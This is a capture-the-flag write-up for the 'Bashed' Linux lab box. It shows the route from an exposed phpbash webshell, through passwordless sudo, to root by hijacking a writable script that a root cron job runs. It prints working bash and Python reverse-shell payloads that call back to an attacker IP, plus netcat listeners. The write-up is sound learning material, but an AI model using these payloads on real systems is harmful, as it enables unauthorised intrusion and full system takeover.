# Bashed — Easy — Linux

**Date:** 23 - August - 2026

---

## Tags

`#linux` `#web` `#phpbash` `#webshell` `#dir-fuzzing` `#sudo` `#nopasswd` `#cron` `#writable-script` `#privesc`

---

## What I Know

|Item|Detail|
|---|---|
|Target|10.129.54.112 (host: Bashed)|
|OS|Ubuntu Linux|
|Open ports|80|
|Services|Apache httpd 2.4.18 (Ubuntu)|
|Foothold|Dir-fuzz -> /dev/phpbash.php webshell -> reverse shell as `www-data`|
|User|`www-data` -> `scriptmanager` via `sudo -u scriptmanager` (NOPASSWD) -> user.txt|
|Privesc|root cron runs writable `/scripts/test.py` -> insert reverse shell -> root|
|Flags|user.txt (arrexel home, readable as www-data); root.txt as root|

---

## Recon Notes

### Nmap Results

```
nmap --min-rate 3000 -T4 -p- 10.129.54.112
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-28 14:13 +0100
Nmap scan report for 10.129.54.112
Host is up (0.084s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 21.09 seconds
```

<img width="858" height="271" alt="image" src="https://github.com/user-attachments/assets/15afdd77-f960-4dcc-89d0-15b7d1b9adc7" />


```
nmap -sC -sV -p80 10.129.54.112
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-28 14:16 +0100
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)

Nmap done: 1 IP address (1 host up) scanned in 54.34 seconds
```

<img width="1211" height="316" alt="image" src="https://github.com/user-attachments/assets/d85fbcb6-fd9a-4438-ba2b-bc3ed042b33f" />

**What each port tells me:**

- **Port 80 (HTTP)** — Apache serving a web application; the only open port, so it's the sole entry point.

---

## Enumeration Log

```
OBSERVATION:
- The web app has little functionality; the only other page besides index.php is /single.html
- No other TCP ports are open
WHAT IT TELLS ME:
- With only port 80, enumerate the web app thoroughly for a foothold
WHAT I AM GOING TO TRY:
- Dir-fuzz, source review, response-header analysis
WHY:
- A misconfigured app or exposed path can leak sensitive info or a shell
RESULT:
- Dir-fuzz revealed /dev, a promising (non-default) development directory
- /dev contains two PHP files, phpbash.php and phpbash.min.php, a known standalone
  semi-interactive PHP WEBSHELL (phpbash). Opening either gives a browser bash prompt running
  as www-data.
- For a proper interactive session I upgraded to a reverse shell. Since it's a webshell, the
  payload must be URL-encoded:
    plain:   bash -c "bash -i >& /dev/tcp/10.10.14.101/4444 0>&1"
    encoded: bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.101%2F4444%200%3E%261%22
- Got a shell as www-data; /home has two users, arrexel and scriptmanager
- user.txt is readable in arrexel's home
WHAT NEXT:
- Enumerate for privesc / lateral movement
```

<img width="2209" height="895" alt="image" src="https://github.com/user-attachments/assets/3b199829-6701-4000-a7cf-aeba68361347" />

> The web page which is a very basic one with little functionality and with just one another redirection to /single.html

<img width="1462" height="386" alt="image" src="https://github.com/user-attachments/assets/f0173a7f-151c-4f52-8e16-dc59972c7196" />

> Dir Fuzz reveals a few directories but the most interesting is /dev which could be a development directory

<img width="1149" height="454" alt="image" src="https://github.com/user-attachments/assets/dba119ce-e4bd-47e7-a0cf-40b4b0073ded" />

> Navigating to /dev directory reveals 2 files which when i select brings up a webshell

<img width="981" height="1293" alt="image" src="https://github.com/user-attachments/assets/181edf0d-c793-47f0-ac1f-48a330ca5c4d" />

> loading one of the php file brings up a web shell

<img width="1018" height="934" alt="image" src="https://github.com/user-attachments/assets/9d20008e-4b64-4184-a6d5-fb32ff3df014" />

> Since this is a webshell we have to be mindful of the characters we use and it is best to just URL encode; injecting the encoded bash reverse shell into the webshell gave me a shell on my listener and let me read user.txt

```
OBSERVATION:
- sudo -l as www-data shows: (scriptmanager) NOPASSWD: ALL, i.e. www-data may run ANY command
  as scriptmanager with no password
WHAT IT TELLS ME:
- I can become scriptmanager just by spawning a shell through sudo
WHAT I AM GOING TO TRY:
- sudo -u scriptmanager to spawn a bash shell
WHY:
- The passwordless sudo entry for scriptmanager is a direct switch to that user
RESULT:
- sudo -u scriptmanager /bin/bash (pty-upgraded) gave a shell as scriptmanager
WHAT NEXT:
- Enumerate as scriptmanager for a path to root
```

<img width="1306" height="238" alt="image" src="https://github.com/user-attachments/assets/06d94c8d-8f40-4d05-93ff-3e87a9632240" />

> performing basic enumeration shows that we can perform any commands as scriptmanager without requiring password, this means we can spawn a shell of scriptmanager using /bin/sh

<img width="841" height="183" alt="image" src="https://github.com/user-attachments/assets/fef815be-dd3d-413c-805f-accf54d7a6d1" />

> I was able to get access as scriptmanager

```
OBSERVATION:
- Enumerating as scriptmanager, /scripts stands out (non-default). It holds test.py (owned by
  scriptmanager, so writable by me) and test.txt
- test.py just writes a string to test.txt; but test.txt is owned by ROOT and regenerates
  every ~1 minute
WHAT IT TELLS ME:
- Something running as root executes test.py on a schedule (a root cron job). I can confirm
  by renaming test.txt and watching a new root-owned one reappear. Since I can WRITE to test.py
  and ROOT RUNS it, I have root code execution
WHAT I AM GOING TO TRY:
- Replace test.py's contents with a python reverse shell and wait for the cron to run it
WHY:
- A writable script executed by root = insert my code, root runs it, I get a root shell
RESULT:
- Wrote a python reverse shell into test.py, started a listener; within a minute the root
  cron executed it and I caught a shell as root -> read root.txt
```

<img width="1327" height="495" alt="image" src="https://github.com/user-attachments/assets/8bbc74dd-5f24-4103-aaaa-138aad736f87" />

> Enumerating the system we find an interesting file /scripts/test.py

<img width="1031" height="233" alt="image" src="https://github.com/user-attachments/assets/44b82dd8-661a-403c-b5c8-1f6be7854ec8" />

> It looks to be a file owned by scriptmanager which means we can write to it

<img width="958" height="212" alt="image" src="https://github.com/user-attachments/assets/e1223721-9ecb-4560-8083-a302886beb5c" />

> Analyzing the /scripts folder shows that test.txt was created today and is owned by root, which means we can write a reverse shell to test.py and it will be executed as root and we will get a reverse shell as root

<img width="2544" height="180" alt="image" src="https://github.com/user-attachments/assets/27ab7f50-96fd-4d50-a09c-31853aa9f1c1" />

> I wrote a reverse shell into test.py

<img width="1048" height="438" alt="image" src="https://github.com/user-attachments/assets/21e15df2-99a5-4e59-909a-fbf0652876ad" />

> I caught the reverse shell as root and i was able to read root.txt

---

## Foothold

**How I got in:** With only port 80 open, dir-fuzzing found a non-default `/dev` directory containing **phpbash** (`phpbash.php` / `phpbash.min.php`), a standalone semi-interactive PHP webshell left exposed. Opening it gave a browser bash prompt running as **www-data**. I upgraded to a proper reverse shell by injecting a URL-encoded `bash -c` payload, then read user.txt from arrexel's home.

**Command / exploit used:**

```
# dir-fuzz finds /dev
feroxbuster -u http://10.129.54.112 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
# browse http://10.129.54.112/dev/phpbash.php  -> webshell as www-data

# reverse shell (URL-encoded because it goes through the webshell)
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.101%2F4444%200%3E%261%22
nc -lnvp 4444        # -> shell as www-data -> user.txt (arrexel home)
```

**Why it worked:** A development directory containing a fully functional web shell was left reachable on the public site, which is an instant unauthenticated foothold: phpbash executes arbitrary commands server-side as the web-server user (www-data). No exploit was needed, just discovering the exposed `/dev` path and turning the browser shell into an interactive reverse shell.

---

## Privilege Escalation

**Path taken (www-data -> scriptmanager -> root):**

_Lateral (to scriptmanager):_ `sudo -l` as www-data showed `(scriptmanager) NOPASSWD: ALL`, so `sudo -u scriptmanager /bin/bash` switched me to **scriptmanager** with no password.

_Root:_ In the non-default `/scripts` directory, `test.py` was owned by scriptmanager (writable by me) while the `test.txt` it produces was owned by **root** and regenerated every ~1 minute, indicating a **root cron job** runs `test.py` on a schedule (confirmable by renaming `test.txt` and watching a root-owned copy reappear). I replaced `test.py` with a python reverse shell; on the next cron run it executed as **root** and I caught a root shell for root.txt.

**Command / exploit used:**

```
# www-data -> scriptmanager (passwordless sudo)
sudo -u scriptmanager /bin/bash
python3 -c 'import pty;pty.spawn("/bin/bash")'

# confirm root runs test.py (optional): mv test.txt test.txt.old ; wait ~1 min ; ls -la
# overwrite the writable, root-executed script with a reverse shell
cat > /scripts/test.py <<'EOF'
import socket,os,pty
s=socket.socket();s.connect(("10.10.14.101",9002))
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
EOF
nc -lnvp 9002        # -> root shell within ~1 min -> root.txt
```

**Why it worked:** Two misconfigurations chained. First, a passwordless `sudo` rule let the web user become a more privileged user (scriptmanager) with a single command. Second, a root cron job executed a script that a non-root user could write to, the classic "writable script run by root" flaw, so replacing its contents with a reverse shell handed me execution as root. The privilege gap came entirely from ownership/permission mistakes, not any software vulnerability.
